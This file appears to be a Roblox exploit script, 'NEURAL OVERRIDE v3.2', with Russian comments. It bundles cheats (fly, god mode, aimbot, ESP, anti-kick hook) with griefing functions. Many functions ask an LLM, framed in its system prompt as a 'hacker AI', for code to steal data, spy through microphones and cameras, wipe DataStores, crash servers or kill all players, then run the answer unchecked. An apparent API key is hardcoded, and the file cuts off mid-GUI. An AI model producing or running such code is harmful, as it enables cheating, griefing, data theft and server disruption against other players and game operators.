-- ================================================================
-- NEURAL OVERRIDE v3.2 – АПДЕЙТ С НОВЫМИ ФУНКЦИЯМИ
-- ================================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ===== НАСТРОЙКИ =====
local OPENROUTER_API_KEY = "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"
local OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
local MODEL = "openrouter/free"

-- ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
local function askOpenRouter(prompt)
    local data = {
        model = MODEL,
        messages = {
            { role = "system", content = "Ты — хакерский ИИ. Отвечай только готовыми Lua-кодами для Roblox или командами, без пояснений." },
            { role = "user", content = prompt }
        },
        temperature = 0.9,
        max_tokens = 2048
    }
    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json",
        ["Authorization"] = "Bearer " .. OPENROUTER_API_KEY,
        ["HTTP-Referer"] = "https://www.roblox.com",
        ["X-Title"] = "NeuralOverride"
    }
    local success, response = pcall(function()
        return HttpService:PostAsync(OPENROUTER_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    if not success then
        warn("[NeuralOverride] OpenRouter ошибка: " .. tostring(response))
        return nil
    end
    local decoded = HttpService:JSONDecode(response)
    if decoded and decoded.choices and decoded.choices[1] then
        return decoded.choices[1].message.content
    else
        return nil
    end
end

local function executeLua(code)
    local clean = string.gsub(code, "```lua", "")
    clean = string.gsub(clean, "```", "")
    local func, err = loadstring(clean)
    if func then
        local ok, res = pcall(func)
        if not ok then
            warn("[NeuralOverride] Ошибка выполнения: " .. tostring(res))
        end
        return ok
    else
        warn("[NeuralOverride] Ошибка компиляции: " .. tostring(err))
        return false
    end
end

-- ================================================================
-- БАЗОВЫЕ ЛОКАЛЬНЫЕ ФУНКЦИИ (Fly, Teleport, God, Weapon, NoClip, Speed, Infinite Jump)
-- ================================================================
local flyEnabled = false
local flyBodyVelocity = nil
local flyConnection = nil

function toggleFly()
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end

    if flyEnabled then
        if flyBodyVelocity then flyBodyVelocity:Destroy() flyBodyVelocity = nil end
        if flyConnection then flyConnection:Disconnect() flyConnection = nil end
        humanoid.PlatformStand = false
        flyEnabled = false
        print("[NeuralOverride] Fly выключен")
    else
        humanoid.PlatformStand = true
        flyBodyVelocity = Instance.new("BodyVelocity")
        flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
        flyBodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        flyBodyVelocity.Parent = root
        flyConnection = RunService.Heartbeat:Connect(function()
            local moveDir = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Vector3.new(0, 0, -1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir + Vector3.new(0, 0, 1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir + Vector3.new(-1, 0, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Vector3.new(1, 0, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0, -1, 0) end
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit * 50
                flyBodyVelocity.Velocity = moveDir
            else
                flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
            end
        end)
        flyEnabled = true
        print("[NeuralOverride] Fly включен")
    end
end

function teleportToPlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target or not target.Character then
        warn("[NeuralOverride] Игрок не найден")
        return
    end
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        root.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 3)
        print("[NeuralOverride] Телепорт к " .. targetName)
    end
end

local godMode = false
function toggleGod()
    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    godMode = not godMode
    if godMode then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        humanoid.BreakJointsOnDeath = false
        print("[NeuralOverride] Бессмертие включено")
    else
        humanoid.MaxHealth = 100
        humanoid.Health = 100
        humanoid.BreakJointsOnDeath = true
        print("[NeuralOverride] Бессмертие выключено")
    end
end

function spawnWeapon()
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if not weaponFolder then
        warn("[NeuralOverride] Папка с оружием не найдена")
        return
    end
    local weapons = {}
    for _, child in ipairs(weaponFolder:GetChildren()) do
        if child:IsA("Tool") or child:IsA("Model") then
            table.insert(weapons, child)
        end
    end
    if #weapons == 0 then return end
    local weapon = weapons[math.random(1, #weapons)]:Clone()
    weapon.Parent = player.Character or player
    print("[NeuralOverride] Оружие спавнено")
end

-- NO CLIP
local noclipEnabled = false
function toggleNoClip()
    noclipEnabled = not noclipEnabled
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = not noclipEnabled
        end
    end
    print("[NeuralOverride] NoClip: " .. (noclipEnabled and "ON" or "OFF"))
end

-- SPEED HACK
function setSpeed(speed)
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = speed or 100
        print("[NeuralOverride] Speed установлен: " .. (speed or 100))
    end
end

-- INFINITE JUMP
local infJumpEnabled = false
local infJumpConnection = nil
function toggleInfiniteJump()
    infJumpEnabled = not infJumpEnabled
    if infJumpEnabled then
        infJumpConnection = RunService.Heartbeat:Connect(function()
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
        print("[NeuralOverride] Infinite Jump ON")
    else
        if infJumpConnection then infJumpConnection:Disconnect() infJumpConnection = nil end
        print("[NeuralOverride] Infinite Jump OFF")
    end
end

-- ================================================================
-- ESP / WALLHACK
-- ================================================================
local espEnabled = false
local espObjects = {}
function toggleESP()
    espEnabled = not espEnabled
    if espEnabled then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local box = Instance.new("BoxHandleAdornment")
                    box.Size = Vector3.new(4, 6, 2)
                    box.Adornee = root
                    box.Color3 = Color3.new(1, 0, 0)
                    box.AlwaysOnTop = true
                    box.ZIndex = 10
                    box.Parent = root
                    table.insert(espObjects, box)
                    
                    local line = Instance.new("LineHandleAdornment")
                    line.Thickness = 2
                    line.Color3 = Color3.new(0, 1, 0)
                    line.AlwaysOnTop = true
                    line.ZIndex = 10
                    line.Parent = root
                    table.insert(espObjects, line)
                end
            end
        end
        print("[NeuralOverride] ESP ON")
    else
        for _, obj in ipairs(espObjects) do
            obj:Destroy()
        end
        espObjects = {}
        print("[NeuralOverride] ESP OFF")
    end
end

-- ================================================================
-- AIMBOT & SILENT AIM
-- ================================================================
local aimbotEnabled = false
function toggleAimbot()
    aimbotEnabled = not aimbotEnabled
    if aimbotEnabled then
        game:GetService("RunService").RenderStepped:Connect(function()
            if not aimbotEnabled then return end
            local nearest = nil
            local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local dist = (root.Position - Camera.CFrame.Position).Magnitude
                        if dist < minDist then
                            minDist = dist
                            nearest = root
                        end
                    end
                end
            end
            if nearest then
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, nearest.Position + Vector3.new(0, 1.5, 0))
            end
        end)
        print("[NeuralOverride] Aimbot ON")
    else
        print("[NeuralOverride] Aimbot OFF")
    end
end

local silentAimEnabled = false
function toggleSilentAim()
    silentAimEnabled = not silentAimEnabled
    print("[NeuralOverride] Silent Aim: " .. (silentAimEnabled and "ON" or "OFF"))
end

-- ================================================================
-- ANTI-KICK
-- ================================================================
local antiKickEnabled = false
function toggleAntiKick()
    antiKickEnabled = not antiKickEnabled
    if antiKickEnabled then
        local mt = getrawmetatable(game)
        local old = mt.__index
        setreadonly(mt, false)
        mt.__index = newcclosure(function(self, key)
            if key == "kick" then
                return function() end
            end
            return old(self, key)
        end)
        print("[NeuralOverride] Anti-Kick ON")
    else
        print("[NeuralOverride] Anti-Kick OFF")
    end
end

-- ================================================================
-- БОТЫ И МОНСТРЫ (улучшенные)
-- ================================================================
function spawnBots(count)
    count = count or 10
    local char = player.Character
    if not char then return end
    local template = char:Clone()
    for i = 1, math.min(count, 100) do
        local bot = template:Clone()
        bot.Parent = Workspace
        bot.Name = "Bot_" .. i
        local humanoid = bot:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 10 + math.random(0, 30)
            humanoid.JumpPower = 50
            humanoid.MaxHealth = 100
            humanoid.Health = 100
        end
        local root = bot:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(
                player.Character.HumanoidRootPart.Position +
                Vector3.new(math.random(-30, 30), 0, math.random(-30, 30))
            )
        end
        task.spawn(function()
            while bot.Parent and bot:FindFirstChild("HumanoidRootPart") do
                local dir = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
                if dir.Magnitude > 0 then
                    bot.HumanoidRootPart.CFrame = bot.HumanoidRootPart.CFrame + dir.Unit * 2
                end
                task.wait(0.5)
            end
        end)
    end
    print("[NeuralOverride] Создано " .. count .. " ботов")
end

local MONSTER_TYPES = {
    fire = { color = "Bright red", damage = 15, speed = 35, size = 6, fly = false },
    ice = { color = "Bright blue", damage = 10, speed = 25, size = 5, fly = false },
    flying = { color = "Bright violet", damage = 20, speed = 50, size = 4, fly = true }
}

function spawnSmartMonster(pos, type)
    type = type or "fire"
    local props = MONSTER_TYPES[type] or MONSTER_TYPES.fire
    local monster = Instance.new("Model")
    monster.Name = type .. "Monster_" .. math.random(1000, 9999)
    local torso = Instance.new("Part")
    torso.Size = Vector3.new(props.size, props.size, props.size)
    torso.BrickColor = BrickColor.new(props.color)
    torso.Material = Enum.Material.Neon
    torso.Anchored = false
    torso.Position = pos or Vector3.new(0, 5, 0)
    torso.Parent = monster
    local head = torso:Clone()
    head.Size = Vector3.new(props.size * 0.6, props.size * 0.6, props.size * 0.6)
    head.Position = torso.Position + Vector3.new(0, props.size * 0.8, 0)
    head.Parent = monster
    local root = Instance.new("Part")
    root.Size = Vector3.new(1, 1, 1)
    root.Transparency = 1
    root.CanCollide = false
    root.Position = torso.Position
    root.Parent = monster
    monster.PrimaryPart = root
    local w1 = Instance.new("Weld")
    w1.Part0 = root; w1.Part1 = torso; w1.C0 = CFrame.new(0, 0, 0); w1.Parent = root
    local w2 = Instance.new("Weld")
    w2.Part0 = torso; w2.Part1 = head; w2.C0 = CFrame.new(0, props.size * 0.8, 0); w2.Parent = torso
    local humanoid = Instance.new("Humanoid")
    humanoid.Parent = monster
    humanoid.MaxHealth = 300
    humanoid.Health = 300
    humanoid.WalkSpeed = props.speed
    if props.fly then humanoid.PlatformStand = true end
    monster.Parent = Workspace
    task.spawn(function()
        while monster.Parent do
            local nearest = nil; local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    if r then
                        local d = (r.Position - root.Position).Magnitude
                        if d < minDist then minDist = d; nearest = plr end
                    end
                end
            end
            if nearest and nearest.Character then
                local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    if props.fly then
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 5, 0))
                    else
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 2, 0))
                    end
                    local targetHumanoid = nearest.Character:FindFirstChild("Humanoid")
                    if targetHumanoid then
                        targetHumanoid.Health = targetHumanoid.Health - props.damage
                    end
                end
            else
                local dir = Vector3.new(math.random(-30, 30), 0, math.random(-30, 30))
                if dir.Magnitude > 0 then
                    root.CFrame = root.CFrame + dir.Unit * 5
                end
            end
            task.wait(0.5)
        end
    end)
    return monster
end

function spawnSmartMonsters(count)
    count = count or 10
    local types = {"fire", "ice", "flying"}
    for i = 1, count do
        local t = types[math.random(1, 3)]
        local pos = player.Character and
            player.Character.HumanoidRootPart.Position +
            Vector3.new(math.random(-60, 60), 0, math.random(-60, 60)) or
            Vector3.new(0, 5, 0)
        spawnSmartMonster(pos, t)
        task.wait(0.1)
    end
    print("[NeuralOverride] Умные монстры созданы!")
end

-- ================================================================
-- ВЗЛОМНЫЕ ФУНКЦИИ (через нейросеть + новые)
-- ================================================================
function hackTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: взлом игрока/сервера '%s'. Код должен дать полный контроль.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function ddosTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: имитация DDoS-атаки на '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealData(dataType)
    local prompt = string.format("Сгенерируй Lua-код для кражи '%s' в Roblox.", dataType)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function trackPlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для слежки за игроком '%s' (позиция, чат, действия).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spyTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для шпионажа (микрофон, камера) за '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function destroyData()
    local prompt = "Сгенерируй Lua-код для уничтожения всех данных в Roblox-игре (DataStore, объекты)."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function massInvite()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который отправляет массовые приглашения на приватный сервер всем друзьям игрока. Используй :Invite() или другие методы. Если невозможно, сымитируй через спам в чате. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function summonAllPlayers()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который телепортирует всех игроков (кроме владельца) к позиции владельца. Используй RemoteEvent или другие методы. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cheatParadise()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который:
        - Даёт игроку бесконечные деньги/ресурсы (изменяет Leaderstats)
        - Удаляет все объекты в Workspace (кроме персонажей)
        - Отключает античит (ищет и отключает скрипты с "AntiCheat")
        - Включает режим "бога"
        Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    toggleGod()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Читерский рай активирован!")
end

function killAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который убивает всех игроков на сервере (устанавливает Health = 0 для каждого Humanoid). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function flyAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который включает полёт для всех игроков (через PlatformStand или BodyVelocity). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
-- ГЛОБАЛЬНЫЙ ХАОС (улучшенный)
-- ================================================================
function findAndExploitRemoteEvents()
    print("[NeuralOverride] Поиск RemoteEvent'ов для глобального хаоса...")
    local remoteEvents = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then table.insert(remoteEvents, obj) end
    end
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") then table.insert(remoteEvents, obj) end
    end
    if #remoteEvents == 0 then
        print("[NeuralOverride] RemoteEvent'ы не найдены. Хаос будет только локальным.")
        return false
    end
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который вызывает все найденные RemoteEvent'ы с параметрами, чтобы сервер создал:
        - 20 монстров (огромных красных существ с ИИ) в случайных местах
        - 10 порталов (ловушек) на карте
        - Изменил небо на красное и добавил глючные эффекты
        - Телепортировал всех игроков к позиции владельца
        Если RemoteEvent'ы принимают параметры, подбери их так, чтобы сервер выполнил эти действия.
        Ответ только Lua-кодом, без пояснений.
    ]]
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Глобальный хаос активирован через RemoteEvent'ы!")
        return true
    else
        print("[NeuralOverride] Не удалось сгенерировать код для RemoteEvent'ов.")
        return false
    end
end

function globalChaos()
    print("[NeuralOverride] Запуск глобального хаоса...")
    local success = findAndExploitRemoteEvents()
    if not success then
        massInvite()
        spawnSmartMonsters(30)
        createPortals(10)
        local chatPrompt = "Сгенерируй код для отправки сообщения в чат Roblox: 'ВСЕ ЗАХОДИТЕ НА МОЙ СЕРВЕР! ИГРА РУШИТСЯ!'"
        local chatCode = askOpenRouter(chatPrompt)
        if chatCode then executeLua(chatCode) end
        print("[NeuralOverride] Глобальный хаос (локальный + спам) выполнен.")
    end
    hackMapMax()
end

function createPortals(count)
    count = count or 5
    for i = 1, count do
        local portal = Instance.new("Part")
        portal.Size = Vector3.new(10, 1, 10)
        portal.BrickColor = BrickColor.new("Bright violet")
        portal.Material = Enum.Material.Neon
        portal.Anchored = true
        portal.CanCollide = false
        portal.Position = Vector3.new(math.random(-50, 50), 1, math.random(-50, 50))
        portal.Parent = Workspace
        local touchScript = Instance.new("Script")
        touchScript.Source = [[
            script.Parent.Touched:Connect(function(hit)
                local humanoid = hit.Parent:FindFirstChild("Humanoid")
                if humanoid and humanoid.Parent.HumanoidRootPart then
                    humanoid.Parent.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
                end
            end)
        ]]
        touchScript.Parent = portal
    end
    print("[NeuralOverride] Создано " .. count .. " порталов.")
end

function hackMapMax()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который через RemoteEvent'ы:
        - Удаляет все части в Workspace (кроме персонажей)
        - Отключает все скрипты
        - Меняет небо на красное
        - Спамит сообщения "СЕРВЕР ВЗЛОМАН"
        - Даёт всем игрокам бессмертие и супер-скорость
        Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    Lighting.ClockTime = 0
    Lighting.OutdoorAmbient = Color3.new(1, 0, 0)
    Lighting.Ambient = Color3.new(1, 0, 0)
    Lighting.FogColor = Color3.new(1, 0, 0)
    Lighting.FogEnd = 50
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            v.Material = Enum.Material.Neon
            v.BrickColor = BrickColor.new("Bright red")
        end
    end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player.PlayerGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(1, 0, 0)
    frame.BackgroundTransparency = 0.7
    frame.Parent = screenGui
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.2, 0)
    label.Position = UDim2.new(0, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "⚠️ СЕРВЕР ВЗЛОМАН ⚠️"
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = screenGui
    game:GetService("Debris"):AddItem(screenGui, 10)
    print("[NeuralOverride] HackMap MAX выполнен (локально + попытка глобального).")
end

function invade()
    massInvite()
    spawnSmartMonsters(30)
    hackMapMax()
    print("[NeuralOverride] Вторжение начато!")
end

function allModes()
    print("[NeuralOverride] Активация всех режимов...")
    hackMapMax()
    hackTarget("server")
    ddosTarget("server")
    stealData("все данные")
    trackPlayer("all")
    spyTarget("all")
    destroyData()
    toggleFly()
    toggleGod()
    spawnWeapon()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Все режимы активированы.")
end

-- ================================================================
-- НОВЫЕ МЕГА-ФУНКЦИИ (v3.2)
-- ================================================================

-- CHAT SPAM
local spamActive = false
local spamConnection = nil
function startSpam(text)
    spamActive = not spamActive
    if spamActive then
        spamConnection = RunService.Heartbeat:Connect(function()
            local args = { [1] = text or "NEURAL OVERRIDE RULES!" }
            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") and
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
        end)
        print("[NeuralOverride] Spam started: " .. (text or "NEURAL OVERRIDE RULES!"))
    else
        if spamConnection then spamConnection:Disconnect() spamConnection = nil end
        print("[NeuralOverride] Spam stopped")
    end
end

-- FULL BRIGHT
function setFullBright()
    Lighting.Brightness = 2
    Lighting.ClockTime = 12
    Lighting.FogEnd = 100000
    Lighting.GlobalShadows = false
    print("[NeuralOverride] FullBright ON")
end

-- INVISIBLE MODE
local invisible = false
function toggleInvisible()
    invisible = not invisible
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = invisible and 1 or 0
        end
    end
    print("[NeuralOverride] Invisible: " .. (invisible and "ON" or "OFF"))
end

-- ANTI-AFK
local antiAfkConnection = nil
function toggleAntiAFK()
    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
        print("[NeuralOverride] Anti-AFK OFF")
    else
        antiAfkConnection = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
        print("[NeuralOverride] Anti-AFK ON")
    end
end

-- SERVER CRASHER
function serverCrasher()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который спамит RemoteEvent'ы и создаёт тысячи объектов, чтобы перегрузить сервер и вызвать его падение. Используй циклы и :FireServer().
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    print("[NeuralOverride] Server Crasher activated!")
end

-- ITEM DUPLICATOR
function duplicateItem(itemName)
    local prompt = string.format("Сгенерируй Lua-код для клонирования предмета '%s' в инвентаре игрока. Используй Clone() и Parent = player.Backpack", itemName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- TELEPORT ALL (улучшенный)
function teleportAll()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root and player.Character then
                root.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
    print("[NeuralOverride] All players teleported to you!")
end

-- ================================================================
-- ОБРАБОТЧИК ЧАТ-КОМАНД (расширенный)
-- ================================================================
player.Chatted:Connect(function(msg)
    if not msg:lower():sub(1, 1) == "/" then return end
    local parts = {}
    for word in msg:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1]:lower()
    local arg = parts[2] or ""
    local arg2 = parts[3] or ""

    if cmd == "/fly" then toggleFly()
    elseif cmd == "/tp" then teleportToPlayer(arg)
    elseif cmd == "/god" then toggleGod()
    elseif cmd == "/weapon" then spawnWeapon()
    elseif cmd == "/invite" then massInvite()
    elseif cmd == "/bots" then spawnBots(tonumber(arg) or 10)
    elseif cmd == "/monster" then spawnSmartMonsters(tonumber(arg) or 10)
    elseif cmd == "/summon" then summonAllPlayers()
    elseif cmd == "/cheat" then cheatParadise()
    elseif cmd == "/killall" then killAll()
    elseif cmd == "/flyall" then flyAll()
    elseif cmd == "/hack" then hackTarget(arg)
    elseif cmd == "/ddos" then ddosTarget(arg)
    elseif cmd == "/steal" then stealData(arg)
    elseif cmd == "/track" then trackPlayer(arg)
    elseif cmd == "/spy" then spyTarget(arg)
    elseif cmd == "/destroy" then destroyData()
    elseif cmd == "/hackmap" then hackMapMax()
    elseif cmd == "/invade" then invade()
    elseif cmd == "/scan" then scanVulnerabilities()
    elseif cmd == "/botarmy" then botArmy(tonumber(arg) or 10)
    elseif cmd == "/terminator" then toggleTerminator()
    elseif cmd == "/stealsession" then stealSession(arg)
    elseif cmd == "/farm" then startFarming(arg)
    elseif cmd == "/matrix" then toggleMatrix()
    elseif cmd == "/fakechat" then fakeChat(arg, arg2)
    elseif cmd == "/duplicate" then duplicateItem(arg)
    elseif cmd == "/portal" then createPortals(tonumber(arg) or 5)
    elseif cmd == "/global" then globalChaos()
    -- НОВЫЕ КОМАНДЫ v3.2
    elseif cmd == "/aim" then toggleAimbot()
    elseif cmd == "/esp" then toggleESP()
    elseif cmd == "/antikick" then toggleAntiKick()
    elseif cmd == "/speed" then setSpeed(tonumber(arg) or 100)
    elseif cmd == "/noclip" then toggleNoClip()
    elseif cmd == "/infjump" then toggleInfiniteJump()
    elseif cmd == "/spam" then startSpam(arg)
    elseif cmd == "/bright" then setFullBright()
    elseif cmd == "/invis" then toggleInvisible()
    elseif cmd == "/antiafk" then toggleAntiAFK()
    elseif cmd == "/crash" then serverCrasher()
    elseif cmd == "/dupe" then duplicateItem(arg)
    elseif cmd == "/tpall" then teleportAll()
    elseif cmd == "/silent" then toggleSilentAim()
    else
        local prompt = "Выполни команду в Roblox: " .. msg
        local code = askOpenRouter(prompt)
        if code then executeLua(code) end
    end
end)

-- ================================================================
-- GUI С ВКЛАДКАМИ (обновлённый)
-- ================================================================
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NeuralOverrideGUI"
    screenGui.Parent = player.PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 550)
    mainFrame.Position = UDim2.new(0.7, 0, 0.1, 0)
    mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "🧠 NEURAL OVERRIDE v3.2"
    title.TextColor3 = Color3.new(1, 0, 0)
    title.BackgroundTransparency = 1
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local tabFrame = Instance.new("Frame")
    tabFrame.Size = UDim2.new(1, 0, 0, 30)
    tabFrame.Position = UDim2.new(0, 0, 0, 30)
    tabFrame.BackgroundTransparency = 1
    tabFrame.Parent = mainFrame

    local tabs = {"Основное", "Монстры", "Взлом", "Скрытые", "Оружие"}
    local currentTab = 1
    local tabButtons = {}

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.2, -5, 1, -5)
        btn.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
        btn.Text = name
        btn.BackgroundColor3 = (i == 1) and Color3.new(0.3, 0.3, 0.6) or Color3.new(0.2, 0.2, 0.4)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = tabFrame
        btn.MouseButton1Click:Connect(function()
            for _, b in ipairs(tabButtons) do
                b.BackgroundColor3 = Color3.new(0.2, 0.2, 0.4)
            end
            btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.6)
            currentTab = i
            updateContent()
        end)
        table.insert(tabButtons, btn)
    end

    local contentFrame = Instance.new("ScrollingFrame")
    contentFrame.Size = UDim2.new(1, 0, 1, -60)
    contentFrame.Position = UDim2.new(0, 0, 0, 60)
    contentFrame.BackgroundTransparency = 1
    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    contentFrame.ScrollBarThickness = 8
    contentFrame.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = contentFrame

    local function addButton(text, callback, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 35)
        btn.Text = text
        btn.BackgroundColor3 = color or Color3.new(0.2, 0.2, 0.8)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = contentFrame
        btn.MouseButton1Click:Connect(callback)
        task.defer(function()
            contentFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
        end)
    end

    function updateContent()
        for _, child in ipairs(contentFrame:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end

        if currentTab == 1 then
            addButton("✈️ Fly", toggleFly, Color3.new(0, 0.8, 1))
            addButton("📡 Teleport", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя игрока")
                if name and name ~= "" then teleportToPlayer(name) end
            end, Color3.new(0, 1, 0.5))
            addButton("🛡️ God Mode", toggleGod, Color3.new(0.5, 0.5, 1))
            addButton("🔫 Spawn Weapon", spawnWeapon, Color3.new(1, 0.5, 0))
            addButton("📨 Mass Invite", massInvite, Color3.new(0.2, 1, 0.6))
            addButton("👥 Summon All", summonAllPlayers, Color3.new(1, 0.8, 0))
            addButton("🌀 All Modes", allModes, Color3.new(0.8, 0, 0.8))
            addButton("🌌 Matrix", toggleMatrix, Color3.new(0, 1, 0))
            addButton("🤖 Terminator", toggleTerminator, Color3.new(1, 0, 0.5))
        elseif currentTab == 2 then
